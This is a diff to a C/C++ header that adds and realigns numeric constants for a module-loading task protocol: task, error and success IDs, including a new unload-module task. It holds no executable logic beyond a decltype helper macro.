@@ -34,9 +34,10 @@
 
 
 // Task IDs
-#define TASK_LOAD_MODULE 0xb1
-#define TASK_LIST_MODULES 0xb2
-#define TASK_RUN_CMD      0xb3
+#define TASK_LOAD_MODULE   0xb1
+#define TASK_LIST_MODULES  0xb2
+#define TASK_RUN_CMD       0xb3
+#define TASK_UNLOAD_MODULE 0xb4
 
 
 // Output IDs
@@ -46,13 +47,16 @@
 #define OUTPUT_ERROR       0xc4
 
 // Error Ids
-#define ERROR_MODULE_LOAD_FAILURE 11
-#define ERROR_MODULE_LOADED       10
+#define ERROR_MODULE_LOADED         10
+#define ERROR_MODULE_LOAD_FAILURE   11
+#define ERROR_MODULE_NOT_LOADED     12
+#define ERROR_MODULE_UNLOAD_FAILURE 13
 
 
 // Success IDs
 #define TASK_SUCCESS_NO_OUTPUT 0xf3
 #define SUCCESS_MODULE_LOAD 0xb1
+#define SUCCESS_MODULE_UNLOAD 0xb5
 
 
 #define DECL( x ) decltype( x ) * x
